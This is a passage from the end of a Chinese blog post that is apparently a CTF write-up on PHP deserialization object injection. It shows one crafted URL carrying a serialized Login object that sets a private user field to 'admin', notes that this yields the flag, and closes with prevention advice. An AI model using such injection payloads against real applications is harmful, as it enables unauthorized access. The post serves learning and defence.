+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://122.114.252.87:1126/unserialize/?exp=O%3A5%3A%22Login%22%3A1%3A%7Bs%3A11%3A%22%00Login%00user%22%3Bs%3A5%3A%22admin%22%3B%7D</span><br></pre></td></tr></table></figure>
+<p>最后页面显示出了我们想要的flag~</p>
+<p><img src="https://s2.loli.net/2023/03/05/CRmFJ98r7YqbloD.png" alt=""></p>
+<p>所以说，我在博客前面写到，强烈建议对象序列化后再进行个url编码处理</p>
+<p>这不禁让我联想到最近学校举行的一个微信小程序开发比赛，我在小组中主要承担后端的工作；我在进行一些API接口调用的时候，一开始一直调用失败，后来才反应过来需要将参数进行url编码处理，尤其常见是传入一些带中文的参数的情况，url编码更加重要</p>
+<h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><p>如果页面最后需要用到post方法提交的话，我们在url上注入参数是无用的，因此需要用到一些工具或者插件模拟post方式提交</p>
+<p>这里除了一般程序员会用到的<code>postman</code>，我还推荐一个插件<code>HackBar</code></p>
+<p><a href="https://zi0wi15on.top/2023/03/05/20230305-HackBar插件安装/">https://zi0wi15on.top/2023/03/05/20230305-HackBar插件安装/</a></p>
+<h1 id="PHP反序列化高阶学习（Php-phar-PHP-POP-链）"><a href="#PHP反序列化高阶学习（Php-phar-PHP-POP-链）" class="headerlink" title="PHP反序列化高阶学习（Php phar / PHP POP 链）"></a>PHP反序列化高阶学习（Php phar / PHP POP 链）</h1><p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fish-pompom/p/11126473.html">PHP反序列化从初级到高级利用篇</a>]</p>
+<h1 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h1><ul>
+<li><p>严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则</p>
+</li>
+<li><p>对于unserialize后的变量内容进行检查，以确定内容没有被污染</p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://zi0wi15on.top">zi0wi15on</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zi0wi15on.top/2023/03/04/20230304-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5/">https://zi0wi15on.top/2023/03/04/20230304-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zi0wi15on.top" target="_blank">Bonjour Hacker</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/03/05/sT8IWXuza5PChQ7.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/04/20230304-Misc-WriteUp-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902/" title="Misc WriteUp 流量分析2"><img class="cover" src="https://s2.loli.net/2023/03/04/Z84tvNLFslGBjIn.png" onerror="onerror=null;src='/personal/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Misc WriteUp 流量分析2</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/05/20230305-HackBar%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/" title="HackBar插件安装"><img class="cover" src="https://s2.loli.net/2023/03/05/AYnte9P2bScfhgy.png" onerror="onerror=null;src='/personal/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HackBar插件安装</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/03/30/20230330-SQL%E5%8D%95%E5%BC%95%E5%8F%B7%E6%B3%A8%E5%85%A5%E4%B8%8D%E6%8A%A5%E9%94%99/" title="SQL单引号注入不报错"><img class="cover" src="https://s2.loli.net/2023/03/30/1FfjOtQNwl4XGZy.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-03-30</div><div class="title">SQL单引号注入不报错</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%9C%89%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">为什么会有序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">实现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#public%E3%80%81protected%E3%80%81private"><span class="toc-number">1.2.2.</span> <span class="toc-text">public、protected、private</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E4%BE%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">用例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php7-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%8D%E6%95%8F%E6%84%9F"><span class="toc-number">1.2.4.</span> <span class="toc-text">php7.1+反序列化对类属性不敏感</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F"><span class="toc-number">2.2.</span> <span class="toc-text">从序列化到反序列化的魔术方法的执行顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E5%88%AB%E8%AF%B4%E6%98%8E"><span class="toc-number">2.3.</span> <span class="toc-text">特别说明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">实践 - 对象注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E5%A5%97%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">注入基本套路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">3.2.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5"><span class="toc-number">3.3.1.</span> <span class="toc-text">复制序列化的源代码片段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E6%8E%89%E5%92%8C%E5%B1%9E%E6%80%A7%E4%B8%8D%E7%9B%B8%E5%85%B3%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">3.3.2.</span> <span class="toc-text">注释掉和属性不相关的内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%B1%9E%E6%80%A7%E8%B5%8B%E5%80%BC"><span class="toc-number">3.3.3.</span> <span class="toc-text">给属性赋值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">3.3.4.</span> <span class="toc-text">输出序列化字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.5.</span> <span class="toc-text">url参数注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get"><span class="toc-number">3.3.5.1.</span> <span class="toc-text">get</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url%E7%BC%96%E7%A0%81"><span class="toc-number">3.3.5.2.</span> <span class="toc-text">url编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#post"><span class="toc-number">3.3.5.3.</span> <span class="toc-text">post</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AB%98%E9%98%B6%E5%AD%A6%E4%B9%A0%EF%BC%88Php-phar-PHP-POP-%E9%93%BE%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">PHP反序列化高阶学习（Php phar &#x2F; PHP POP 链）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">防范方法</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2023/03/05/sT8IWXuza5PChQ7.png')"><div id="footer-wrap"><div class="copyright">&copy;2023 By zi0wi15on</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://www.zi0wi15on.top/">back to HOME</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="8485130843" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-autoplay="true" data-preload="none" data-order="random" data-listfolded="true" data-lrctype="-1"> </div><script src="https://cdn.jsdelivr.net/npm/@docsearch/js@3"></script> - <script type="text/x-mathjax-config">MathJax.Hub.Config({menuSettings:{zoom:"None"},showMathMenu:false,jax:["input/TeX","output/CommonHTML"],extensions:["tex2jax.js"],TeX:{extensions:["AMSmath.js","AMSsymbols.js"],equationNumbers:{autoNumber:"AMS"}},tex2jax:{inlineMath:[["\\(", "\\)"]],displayMath:[["\\[", "\\]"]]}});</script><script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="EXP,payload,shellcode,社会工程学,蓝队,CTF,AWD,Misc,Crypto,Reverse,Pwn,Mobile,Flag,注入攻击,BruteForce,rockyou,脱壳,撞库,免杀,反序列化,应急响应,代码审计,数字取证,可信计算只因,whois,POC测试,XSS,SSRF,钓鲸,DDoS,WebShell,访问控制,CMS,溯源反制,IPS,CA,IoT,Hook,kernel,RSA,AES,Hash,CISP,0day,Petya,log4j,RCE,逻辑漏洞,OWASP Top10,SSRF,XSS,永恒之蓝,熊猫烧香,BurpSuite,Hashcat,Nessus,Nmap,MSF,OllyDbg,IDA,PEiD,BlackArch,Kali,Mr.Robot,凯文·米特尼克,zi0wi15on" data-fontsize="20px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div class="docsearch-wrap"><div id="docsearch" style="display:none"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css/dist/style.min.css"/><script src="https://cdn.jsdelivr.net/npm/@docsearch/js/dist/umd/index.min.js"></script><script>(() => {
+  docsearch(Object.assign({
+    appId: 'T36950RIKQ',
+    apiKey: '31638accf024d9218397ec9e3d5fb686',
+    indexName: 'zi0wi15on',
+    container: '#docsearch',
+  }, null))
+
+
+  const searchClickFn = () => {
+    document.querySelector('#search-button > .search').addEventListener('click', () => {
+      document.querySelector('.DocSearch-Button').click()
+    })
+  }
+
+  searchClickFn()
+  window.addEventListener('pjax:complete', searchClickFn)
+})()</script></div></body></html>
